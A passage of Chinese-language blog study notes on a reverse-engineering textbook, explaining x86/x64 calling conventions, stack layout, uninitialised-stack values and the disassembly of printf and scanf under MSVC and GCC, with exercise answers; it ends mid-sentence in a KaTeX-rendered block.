x86-64</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">$SG2989  DB      &#39;hello, world&#39;, 0AH 00Hmain     PROC         sub     rsp, 40         lea     rcx, OFFSET FLAT:$SG2989         call    printf         xor     eax, eax         add     rsp, 40         ret     0main     ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在x86-64框架的CPU里，所有的物理寄存器都被扩展为64位寄存器。寄存器变为r字开头</p><p>为了尽可能充分地利用寄存器、减少访问内存数据的次数，编译器会充分利用寄存器传递函数参数（请参见64.3节的fastcall约定）。也就是说，编译器会优先使用寄存器传递部分参数，再利用内存（数据栈）传递其余的参数。<code>Win64的程序</code>还会使用<code>RCX、RDX、R8、R9</code>这4个寄存器来存放函数参数。我们稍后就会看到这种情况：printf()使用RCX寄存器传递参数，而没有像32位程序那样使用栈传递数据。</p><p>main()函数的返回值是整数类型的零，但是出于兼容性和可移植性的考虑，C语言的编译器仍将使用<code>32位的零</code>。换而言之，即使是64位的应用程序，在程序结束时EAX的值是零，而R<code>AX的值不一定会是零。</code></p><p>数据栈的对应空间里仍留有40字节的数据。这部分数据空间有个专用的名词，即<code>阴影空间</code>（shadow space）</p><h3 id="gcc-x86-64"><a class="markdownIt-Anchor" href="#gcc-x86-64"></a> gcc x86-64</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.string &quot;hello, world\n&quot;main:         sub      rsp, 8         mov      edi, OFFSET FLAT:.LC0 ; &quot;hello, world&quot;         xor      eax, eax  ; number of vector registers passed         call     printf         xor      eax, eax         add      rsp, 8         ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Linux、BSD和Mac OS X系统中的应用程序</strong>，会优先使用<code>RDI、RSI、RDX、RCX、R8、R9这6个寄存器传递函数所需的头6个参数</code>，然后使用数据栈传递其余的参数。</p><p>使用了<code>EDI</code>寄存器来传递字符串指针，为什么不用<code>RDI</code></p><p>需要注意的是，64位汇编指令MOV在写入R-寄存器的低32位地址位的时候，即对E-寄存器进行写操作的时候，会同时清除R-寄存器中的高32位地址位。所以, “MOV EAX, 011223344h”能够对RAX寄存器进行正确的赋值操作，因为该指令会清除（置零）高地址位的内容。</p><p>使用<code>EDI</code>是因为可以使<code>opcode</code>由7个字节减少到5个字节,gcc优化</p><p><code>gcc</code>的优化有很多特性，例如:它可能会把字符串拆出来单独使用。以节省内存</p><h3 id="problems"><a class="markdownIt-Anchor" href="#problems"></a> Problems</h3><p>1.答:调用了<code>MessagBeep</code>这个函数，参数为0xFFFFFFFF</p><h2 id="chap4-函数序言和函数尾声"><a class="markdownIt-Anchor" href="#chap4-函数序言和函数尾声"></a> Chap4 函数序言和函数尾声</h2><p>略</p><h2 id="chap5-栈"><a class="markdownIt-Anchor" href="#chap5-栈"></a> Chap5 栈</h2><ul><li><p>栈就是CPU寄存器里的某个指针所指向的一片内存区域。这里所说的“某个指针”通常位于x86/x64平台的ESP寄存器/RSP寄存器，以及ARM平台的SP寄存器。</p></li><li><p>操作栈的最常见的指令是PUSH和POP，<code>PUSH</code>指令会对ESP/RSP/SP寄存器的值进行减法运算，使之减去4（32位）或8（64位），然后将操作数写到上述寄存器里的指针所指向的内存中。<code>POP</code>指令是PUSH指令的逆操作：它先从栈指针（Stack Pointer，上面三个寄存器之一）指向的内存中读取数据，用以备用（通常是写到其他寄存器里），然后再将栈指针的数值加上4或8。</p></li><li><p>栈是逆增长的，即从高地址向低地址增长</p></li></ul><hr /><h3 id="栈的用途"><a class="markdownIt-Anchor" href="#栈的用途"></a> 栈的用途</h3><ul><li><p>保存函数的返回地址</p><p><code>call</code>指令等价于<code>push 返回地址</code>与<code>jmp 函数地址</code></p><p><code>ret</code>指令从栈中读取返回地址，然后跳转到这个地址，等价于<code>pop 返回地址</code>与<code>jmp 返回地址</code></p><p>由此可实现函数的递归调用</p></li><li><p>参数传递</p><p>最常用的参数传递约定是<code>cdecl</code></p><p>以下为其主要规则</p><ol><li><strong>参数从右到左压入栈</strong></li><li><strong>调用者负责清理栈</strong>：函数调用结束后，调用者需要负责从栈中弹出传递给函数的所有参数。这意味着编译器会在调用函数之后生成相应的代码来调整堆栈指针，恢复调用前的状态。</li><li><strong>可变参数列表支持</strong>：cdecl 支持函数具有可变数量的参数（如 printf 函数），这是通过在参数列表中使用省略号（…）来表示的。</li><li><strong>返回值通常在EAX寄存器中</strong>（对于x86架构）：大多数情况下，函数的返回值如果大小适当（比如整数、指针），会通过EAX寄存器返回。对于更大的返回类型，可能会通过其他方式，如通过指针传递。</li></ol><p>例如</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">push arg3push arg2push arg1call fadd esp.12;4*3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>被调用的函数可以通过栈指针获取所需参数</p><table><thead><tr><th>ESP</th><th>返回地址</th></tr></thead><tbody><tr><td>ESP+4</td><td>arg1, 它在IDA里记为arg_0</td></tr><tr><td>ESP+8</td><td>arg2, 它在IDA里记为arg_4</td></tr><tr><td>ESP+0xC</td><td>arg3, 它在IDA里记为arg_8</td></tr></tbody></table><p>需要注意的是，程序员可以使用栈来传递参数，也可以不使用栈传递参数。参数处理方面并没有相关的硬性规定。例如也可以用寄存器或者堆上开辟内存进行传参，不过在x86这种约定已是习惯</p><p>如果函数可处理的参数数量可变，就需要用说明符如%d进行格式化说明，明确参数信息</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d %d %d"</span><span class="token punctuation">,</span> <span class="token number">1234</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令不仅会让printf()显示1234，而且还会让它显示数据栈内1234之后的两个地址的随机数。</p><p>由此可知，声明main()函数的方法并不是那么重要。我们可以将之声明为<code>main(),main(int argc, char *argv[])或main(int argc, char *argv[], char *envp[])</code>,CRT中调用<code>main()</code>指令如下:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">push envppush argvpush argccall main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>存储局部变量</p></li><li><p>x86.alloca()函数</p><p><code>malloc()</code>是在堆上分配内存，而<code>alloc()</code>直接使用栈来分配内存</p><p>由于函数尾声的代码会还原<code>ESP</code>的值，不需要特地使用<code>free()</code>来释放内存</p></li><li><p>(Win)SEH结构化异常处理</p><p>如果程序里存在<code>SEH</code>记录，那么记录会保存在栈中</p></li><li><p>缓冲区溢出保护</p></li><li><p>典型的栈的内存存储格式</p><p>在32位系统中，在程序调用函数之后、执行它的第一条指令之前，栈在内存中的存储格式一般如下表所示。</p><table><thead><tr><th>…</th><th>……</th></tr></thead><tbody><tr><td>ESP-0xC</td><td>第2个局部变量，在IDA里记为var_8</td></tr><tr><td>ESP-8</td><td>第1个局部变量，在IDA里记为var_4</td></tr><tr><td>ESP-4</td><td>保存的EBP值</td></tr><tr><td>ESP</td><td>返回地址</td></tr><tr><td>ESP+4</td><td>arg1, 在IDA里记为arg_0</td></tr><tr><td>ESP+8</td><td>arg2, 在IDA里记为arg_4</td></tr><tr><td>ESP+0xC</td><td>arg3, 在IDA里记为arg_8</td></tr><tr><td>…</td><td>……</td></tr></tbody></table></li></ul><hr /><h3 id="栈的噪音"><a class="markdownIt-Anchor" href="#栈的噪音"></a> 栈的噪音</h3><p>函数退出以后,原有栈的空间里的局部变量不会被自动清除，仍然保留就成了栈中的脏数据</p><p>例如</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> b<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">;</span>        <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"%d, %d, %d\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">f2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们会发现，没有对f2的变量初始化，仍然打印的是 1 2 3</p><p>可以研究一下汇编代码,利用MSVS编译的代码如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">$SG2752 DB      &#39;%d, %d, %d&#39;, 0aH, 00H_c$ &#x3D; -12       ; size &#x3D; 4_b$ &#x3D; -8        ; size &#x3D; 4_a$ &#x3D; -4        ; size &#x3D; 4_f1    PROC       push     ebp       mov      ebp, esp       sub      esp, 12       mov      DWORD PTR _a$[ebp], 1       mov      DWORD PTR _b$[ebp], 2       mov      DWORD PTR _c$[ebp], 3       mov      esp, ebp       pop      ebp       ret      0_f1    ENDP_c$ &#x3D; -12       ; size &#x3D; 4_b$ &#x3D; -8        ; size &#x3D; 4_a$ &#x3D; -4        ; size &#x3D; 4_f2    PROC       push     ebp       mov      ebp, esp       sub      esp, 12       mov      eax, DWORD PTR _c$[ebp]       push     eax       mov      ecx, DWORD PTR _b$[ebp]       push     ecx       mov      edx, DWORD PTR _a$[ebp]       push     edx       push     OFFSET $SG2752 ; ’%d, %d, %d’       call     DWORD PTR __imp__printf       add      esp, 16       mov      esp, ebp       pop      ebp       ret      0_f2    ENDPmain   PROC       push     ebp       mov      ebp, esp       call     _f1       call     _f2       xor      eax, eax       pop      ebp       ret      0_main  ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个特例里，第二个函数在第一个函数之后执行，而第二个函数变量的地址和SP的值又与第一个函数的情况相同。所以，相同地址的变量获得的值相同。</p><p>总而言之，在运行第二个函数时，栈中的所有值（即内存中的单元）受前一个函数的影响，而获得了前一个函数的变量的值。严格地说，这些地址的值不是随机值，而是可预测的伪随机值。</p><h3 id="problems-2"><a class="markdownIt-Anchor" href="#problems-2"></a> Problems</h3><h4 id="51"><a class="markdownIt-Anchor" href="#51"></a> 5.1</h4><p>如果使用MSVC编译、运行下列程序，将会打印出3个整数。这些数值来自哪里？如果使用MSVC的优化选项“/Ox”，程序又会在屏幕上输出什么？为什么GCC的情况完全不同？</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;int main() &#123;         printf (&quot;%d, %d, %d\n&quot;);         return 0;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果未启用MSVC的优化编译功能，程序显示的数字分别是EBP的值、RA和argc。在命令行中执行相应的程序即可进行验证。</p><p>如果启用了MSVC的优化编译功能，程序显示的数字分别来自：返回地址RA、argc和数组argv［］。</p><p>GCC会给main() 函数的入口分配16字节的地址空间，所以输出内容会有不同。</p><h4 id="52"><a class="markdownIt-Anchor" href="#52"></a> 5.2</h4><p>答：打印时间</p><h2 id="chap6-printf函数与参数传递"><a class="markdownIt-Anchor" href="#chap6-printf函数与参数传递"></a> Chap6 printf()函数与参数传递</h2><p>演示程序</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a=%d,b=%d,c=%d"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用<code> g++ -m32 -o 1 1.c</code>进行编译或者使用<code>MSVS</code>工具链进行编译，跟随本书的节奏，配置一下<code>MSVS</code>的环境</p><p><a href="https://learn.microsoft.com/zh-cn/cpp/build/building-on-the-command-line?view=msvc-170#download-and-install-the-tools">通过命令行使用 Microsoft C++ 工具集 | Microsoft Learn</a></p><p>首先将<code>Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build</code>加入环境变量</p><p>命令行输入<code>vcvarsall.bat x86</code></p><p>然后<code>cl 1.cpp</code></p><hr /><p>MSVS工具链一些常用的指令</p><p><code>cl /Fa 1.c</code>生成不带注释的汇编代码</p><p><code>cl /FAs 1.c</code>生成带注释的汇编代码,生成1.asm</p><p><code>dumpbin /all example.obj</code>显示目标文件中的所有信息，包括段内容、符号表和重定位信息。</p><p>/c 代表只编译不链接。</p><p>/I 指定头文件的目录</p><p>/C 在编译期间保留代码注释，这里和/I连在一起使用，/IC</p><p>首先介绍一个概念，VC中有个PDB文件，全称是Program Database，用来存放程序信息的小的<a href="http://lib.csdn.net/base/14">数据库</a>文件。</p><p>编译Debug版本时，调试信息需要保留，我们可以选择直接将调试信息写到.obj文件中，或者存到.pdb文件中。</p><p>/Z7 不产生.pdb文件，将所有调试信息存入.obj文件中</p><p>/Zi和/ZI 都产生.pdb文件，不过/ZI支持&quot;编辑继续调试&quot;功能, (the edit and continue feature), 看上去更酷，但是我从来没有用过这个功能。</p><p>/ZI有一些边际效应，会禁止#pragma optmize 指令，也不能和/clr一起用。</p><p>/nologo- 已经无效，自己生成命令行的时候，没必要用了。</p><p>/W3 也中警告级别，VC提供了很多警告级别，参考<a href="http://msdn.microsoft.com/en-us/library/vstudio/thxezb7y.aspx">http://msdn.microsoft.com/en-us/library/vstudio/thxezb7y.aspx</a></p><p>自己编译的话，直接用/Wall最好。</p><p>/WX- 不太明白为什么有 - 号，（估计是和:NO的意思相同，也就是不启用该功能）， /WX的意思是将warning转变成error，这样强迫消除所有的warning，如果和/Wall一起使用，那是最好的。</p><p>/sdl 是对代码进行安全检查，如果发现相关警告，转变成错误输出</p><p>/Od 禁止优化</p><p>/Oy- 禁止该选项，该选项如果没有 - 号，则会在x86上编译时忽略frame-pointer，起到加速程序的作用。 frame-pointer，我暂时不知道是啥。</p><p>/D 预处理定义，后面可以跟不同的参数都是宏啊，比如<br />/Gm 启用最小化重新编译, VC用.idb保留了上次编译的缓存信息，包括文件依赖关系。下次编译时可以使用.idb文件用来检查，跳过不需要重新编译的文件。</p><p>具体参见:</p><p><a href="https://learn.microsoft.com/en-us/cpp/build/reference/compiler-options?view=msvc-170&amp;redirectedfrom=MSDN">MSVC Compiler Options | Microsoft Learn</a></p><h3 id="x86"><a class="markdownIt-Anchor" href="#x86"></a> x86</h3><p>MSVS编译得到的汇编指令如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_TEXTSEGMENT_mainPROC; 3    : &#123;pushebpmovebp, esp; 4    :     printf(&quot;a&#x3D;%d,b&#x3D;%d,c&#x3D;%d&quot;,1,2,3);push3push2push1pushOFFSET $SG9695call_printfaddesp, 16; 00000010H; 5    :     return 0; xoreax, eax; 6    : &#125;popebpret0_mainENDP_TEXTENDS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到<code>printf()</code>函数的参数是逆序存入栈中，第一个参数在最后入栈</p><p>在<code>32</code>位下，32位地址指针和int类型数据都占据<code>32位</code>即<code>4字节</code>的空间，因此4个参数总共占用<code>16</code>字节的存储空间</p><p>因此在调用函数之后，“ADD ESP, X”指令修正ESP寄存器中的栈指针。通常情况下，我们可以通过call之后的这条指令判断参数的数量：<code>变量总数＝*X*÷4。</code>(仅适用于调用约定为<code>cdecl</code>的程序)</p><p>如果某个程序连续地调用多个函数，且调用函数的指令之间不夹杂其他指令，那么编译器可能把释放参数存储空间的“ADD ESP,X”指令进行合并，一次性地释放所有空间</p><hr /><p>体验用<code>onlydbg</code>加载这个程序</p><p>这里需要用到debug版本的编译命令</p><p><code>cl /Z7 /EHsc 1.exe 1.c</code>便于跟踪程序</p><p>找到<code>main</code>函数的方法:方法很多，不细说了</p><p>具体操作按书上来</p><h2 id="chap7-scanf"><a class="markdownIt-Anchor" href="#chap7-scanf"></a> Chap7 scanf()</h2><p>演示程序</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> x<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter X:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You Entered: %d\n"</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="x86-2"><a class="markdownIt-Anchor" href="#x86-2"></a> x86</h3><p><code>cl /FAs /Z7 2 2.c</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_DATASEGMENT$SG9696DB&#39;Enter X:&#39;, 0aH, 00HORG $+2$SG9697DB&#39;%d&#39;, 00HORG $+1$SG9698DB&#39;You Entered: %d&#39;, 0aH, 00H_DATAENDS_TEXTSEGMENT_x$ &#x3D; -4; size &#x3D; 4_mainPROC; 3    : &#123;pushebpmovebp, esppushecx; 4    :     int x;; 5    :     printf(&quot;Enter X:\n&quot;);pushOFFSET $SG9696call_printfaddesp, 4; 6    :     scanf(&quot;%d&quot;, &amp;x);leaeax, DWORD PTR _x$[ebp]pusheaxpushOFFSET $SG9697call_scanfaddesp, 8; 7    : ; 8    :     printf(&quot;You Entered: %d\n&quot;, x);movecx, DWORD PTR _x$[ebp]pushecxpushOFFSET $SG9698call_printfaddesp, 8; 9    :     return 0;xoreax, eax; 10   : &#125;movesp, ebppopebpret0_mainENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>汇编解读:</p><ul><li><p>可以看到，<code>scanf()</code>传递的第二个参数(eax)是一个指向栈中的指针，x是局部变量，存储在栈中。在栈中分配了4字节空间，存储局部变量x</p></li><li><p>**汇编宏_x$ （其值为−4）**用于访问局部变量<em>x</em>，而EBP寄存器用来存储栈当前帧的指针。</p><p>在函数运行的期间，EBP一直指向当前的栈帧（stack frame）。这样，函数即可通过<strong>EBP+offset的方式访问本地变量、以及外部传入的函数参数</strong>。</p><p>ESP也可以用来访问本地变量，获取函数所需的运行参数。不过<strong>ESP的值经常发生变化，用起来并不方便</strong>。函数在启动之初就会利用EBP寄存器保存ESP寄存器的值。这就是为了确保在函数运行期间保证EBP寄存器存储的原始ESP值固定不变。</p><p>在32位系统里，典型的栈帧（stack frame）结构如下表所示。</p><table><thead><tr><th>……</th><th>……</th></tr></thead><tbody><tr><td>EBP-8</td><td>局部变量＃2，IDA标记为var_8</td></tr><tr><td>EBP-4</td><td>局部变量＃1，IDA标记为var_4</td></tr><tr><td>EBP</td><td>EBP的值</td></tr><tr><td>EBP+4</td><td>返回地址Return address</td></tr><tr><td>EBP+8</td><td>函数参数＃1，IDA标记为arg_0</td></tr><tr><td>EBP+0xC</td><td>函数参数＃2，IDA标记为arg_4</td></tr><tr><td>EBP+0x10</td><td>函数参数＃3，IDA标记为arg_8</td></tr><tr><td>……</td><td>……</td></tr></tbody></table></li><li><p><code>scanf()</code>在此例中有两个参数,第一个参数是一个指针，指向含有&quot;%d&quot;的格式化字符串，第二个参数是局部变量<code>x</code>的地址</p><p>“lea eax, DWORD PTR _x$[ebp]”指令将变量<em>x</em>的地址放入EAX寄存器。</p><p>在此处<code>LEA</code>会将<code>EBP</code>寄存器值与宏_x$求和,然后将这个结果存储到<code>EAX</code>，然后把<code>EAX</code>寄存器的值送入栈中(就是把x的地址送入EAX寄存器)</p></li><li><p>而后调用<code>printf()</code>函数，第一个参数即格式化字符串的指针</p><p>第二个参数是<code>mov ecx,[ebp-4]</code>间接取值，传递给ecx的值是<code>ebp-4</code>指向的地址的值，即变量x的值</p></li></ul><hr /><p>用<code>onlydbg</code>动态跟踪这个过程，具体书上有</p><ul><li>调试可以发现，执行完<code>scanf()</code>函数,<code>EAX</code>存储有函数的返回值，其值是<code>scanf()</code>读取参数的个数</li><li>我们可以在栈中找到局部变量的地址，进而跟踪其值</li></ul><h3 id="全局变量"><a class="markdownIt-Anchor" href="#全局变量"></a> 全局变量</h3><p>如果上文的<code>x</code>是全局变量,会有什么样的变化</p><p>将<code>x</code>改成全局变量</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_DATASEGMENT$SG9696DB&#39;Enter X:&#39;, 0aH, 00HORG $+2$SG9697DB&#39;%d&#39;, 00HORG $+1$SG9698DB&#39;You Entered: %d&#39;, 0aH, 00H_DATAENDS_TEXTSEGMENT_mainPROC; 4    : &#123;pushebpmovebp, esp; 5    :    ; 6    :     printf(&quot;Enter X:\n&quot;);pushOFFSET $SG9696call_printfaddesp, 4; 7    :     scanf(&quot;%d&quot;, &amp;x);pushOFFSET _xpushOFFSET $SG9697call_scanfaddesp, 8; 8    : ; 9    :     printf(&quot;You Entered: %d\n&quot;, x);moveax, DWORD PTR _xpusheaxpushOFFSET $SG9698call_printfaddesp, 8; 10   :     return 0;xoreax, eax; 11   : &#125;popebpret0_mainENDP_TEXTENDS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>可以发现<code>x</code>的存储空间不再由栈中存储,而是在数据段(由于没给x赋值，编译器自动优化为bss段(不占据空间))</p></li><li><p>如果对上述源代码稍做改动，加上变量初始化的指令：</p><pre class="line-numbers language-none"><code class="language-none">int x&#x3D;10; &#x2F;&#x2F;设置默认值<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么对应的代码会变为：</p><pre class="line-numbers language-none"><code class="language-none">_DATA   SEGMENT_x      DD      0aH...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>上述指令将初始化x。其中DD代表DWORD，表示<em>x</em>是32位的数据。</p><p>若在IDA里打开对x进行初始化的可执行文件，我们将会看到在数据段的开头部分看到初始化变量<em>x</em>。紧随其后的空间用于存储本例中的字符串。</p><p>用IDA打开7.2节里那个不初始化变量<em>x</em>的例子，那么将会看</p><p>有很多带“？”标记的变量，这是未初始化的<em>x</em>变量的标记。这意味着在程序加载到内存之后，操作系统将为这些变量分配空间、并填入数字零。但是在可执行文件里，这些未初始化的变量不占用内存空间。为了方便使用巨型数组之类的大型数据，人们刻意做了这种设定。</p></li></ul><h3 id="problem"><a class="markdownIt-Anchor" href="#problem"></a> Problem</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">alter_string</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">strcpy</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"Goodbye!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"Result: %s\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">alter_string</span> <span class="token punctuation">(</span><span class="token string">"Hello, world!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>win</code>可运行，因为s是在data段</p><p>而在<code>linux</code>不可运行，s存储在<code>rodata</code>段，不可写</p><h2 id="chap8-参数获取"><a class="markdownIt-Anchor" href="#chap8-参数获取"></a> Chap8 参数获取</h2><p>main()函数把3个数字推送入栈，然后调用了f(int, int, int)。被调用方函数f()通过_a<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo><mn>8</mn><mtext>一类的汇编宏访问所需参数以及函数自定义的局部变量。只不过从被调用方函数的数据栈的角度来看，外部参考的偏移量是正值，而局部变量的偏移量是负值。可见，当需要访问栈帧（</mtext><mi>s</mi><mi>t</mi><mi>a</mi><mi>c</mi><mi>k</mi><mi>f</mi><mi>r</mi><mi>a</mi><mi>m</mi><mi>e</mi><mtext>）以外的数据时，被调用方函数可把汇编宏（例</mtext><msub><mtext>如</mtext><mi>a</mi></msub></mrow><annotation encoding="application/x-tex">=8一类的汇编宏访问所需参数以及函数自定义的局部变量。只不过从被调用方函数的数据栈的角度来看，外部参考的偏移量是正值，而局部变量的偏移量是负值。可见，当需要访问栈帧（stack frame）以外的数据时，被调用方函数可把汇编宏（例如_a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">8</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">类</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">汇</span><span class="mord cjk_fallback">编</span><span class="mord cjk_fallback">宏</span><span class="mord cjk_fallback">访</span><span class="mord cjk_fallback">问</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">及</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">自</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">义</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">局</span><span class="mord cjk_fallback">部</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">只</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">从</span><span class="mord cjk_fallback">被</span><span class="mord cjk_fallback">调</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">方</span><span class="mord 